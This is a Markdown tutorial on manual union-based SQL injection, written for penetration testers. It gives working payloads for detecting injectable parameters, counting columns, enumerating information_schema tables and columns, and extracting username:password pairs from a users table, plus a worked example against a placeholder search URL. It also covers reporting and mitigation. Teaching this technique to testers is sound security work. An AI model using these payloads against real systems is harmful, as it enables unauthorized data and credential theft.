
# Manual Union-Based SQL Injection (SQLi) Guide
Union-based SQL Injection leverages the UNION SQL operator to retrieve data from different tables in the database. This technique can help extract valuable information, such as database schema and sensitive data, by combining the results of multiple queries.

## Steps to Perform Manual Union-Based SQLi

### 1. **Identify Injection Points**
1. **Explore the Application**: Browse through the application to find input fields or parameters that interact with the database. Common targets include search fields, URL parameters, and form submissions.
2. **Test Basic SQL Injection**: Test the parameters with simple SQL injection payloads to determine if they are injectable. Here are some Example payloads:
     ```SQL
     '
     "
     ' OR '1'='1
     ```
3. **Check for UNION Injection**: Determine if UNION-based queries are possible by injecting a basic UNION payload and observing the results. Here are some Example payloads:
     ```SQL
     ' UNION SELECT NULL--
     ```
### 2. **Determine the Number of Columns**
1. **Inject Payload to Test Column Count**:  Inject payloads to identify the number of columns in the original query. This is crucial because the number of columns in the UNION query must match the number of columns in the original query. Here are some Example payloads:
     ```SQL
     ' UNION SELECT NULL, NULL-- 
     ' UNION SELECT NULL, NULL, NULL--
     ```
     Adjust the number of `NULL` values until you find a payload that does not produce an error. The number of `NULL` values corresponds to the number of columns.
### 3. **Extract Data Using UNION**

1. **Retrieve Database Information**: Use the UNION query to extract basic information about the database. Example payload to retrieve the database version:
     ```SQL
     ' UNION SELECT NULL, @@version--
     ' UNION SELECT NULL, database() --
     ```
2. **Identify Table Names**: Extract table names by querying the `information_schema.tables` table. Here are some Example payloads:
     ```SQL
     ' UNION SELECT NULL, table_name FROM information_schema.tables--
     ```
3. **Identify Column Names**: Once you have the table names, find the column names in the tables. Example payload for the `users` table:
     ```SQL
     ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
     ```
4. **Retrieve Data from Tables**:  Extract data from specific columns in the tables. Use the correct number of columns and format the output appropriately. Example payload to retrieve user credentials:
     ```SQL
     ' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--
     ```
### 4. **Verify and Document Findings**
1. **Verify Vulnerability**: Confirm that the UNION query works and retrieves data accurately. Ensure that the number of columns and data returned are as expected.
2. **Document Results**: Record details of your findings, including  The number of columns identified, The payloads used, and The data retrieved, and also make sure to capture screenshots or save request/response logs as evidence.
3. **Assess Impact**: Evaluate the impact of the SQLi vulnerability based on the data obtained and its sensitivity.
4. **Prepare Recommendations**: Offer recommendations for mitigating the SQLi vulnerability, such as using prepared statements, input validation, and limiting error exposure.
## EXAMPLE SCENARIO: Testing a Search Parameter**
1. **Identify Injection Point**: Suppose you have a search parameter `q` in the URL, such as `http://target.com/search?q=test`.
2. **Test for Basic SQL Injection**: Try a simple payload to check if the parameter is injectable:
     ```SQL
     http://target.com/search?q=test'
     ```
3. **Determine Number of Columns**:  Inject different numbers of `NULL` values to find the column count: (e.g., 3).
     ```SQL
     http://target.com/search?q=test' UNION SELECT NULL, NULL-- 
     http://target.com/search?q=test' UNION SELECT NULL, NULL, NULL-- 
     ```
4. **Extract Database Information**: Retrieve the database version:
     ```SQL
     http://target.com/search?q=test' UNION SELECT NULL, @@version, NULL--
     ```
5. **List Tables**: Get the list of tables:
     ```SQL
     http://target.com/search?q=test' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--
     ```
6. **List Columns**: List columns in the `users` table:
     ```SQL
     http://target.com/search?q=test' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--
     ```
7. **Retrieve Data**: Extract user credentials:
     ```SQL
     http://target.com/search?q=test' UNION SELECT NULL, CONCAT(username, ':', password), NULL FROM users--
     ```

## Conclusion

Union-based SQL Injection involves leveraging the UNION SQL operator to combine results from multiple queries and extract data from the database. By following this manual approach, you can identify and exploit SQLi vulnerabilities without relying on automated tools.

Always ensure you have explicit permission to test and adhere to ethical guidelines during your penetration testing activities.
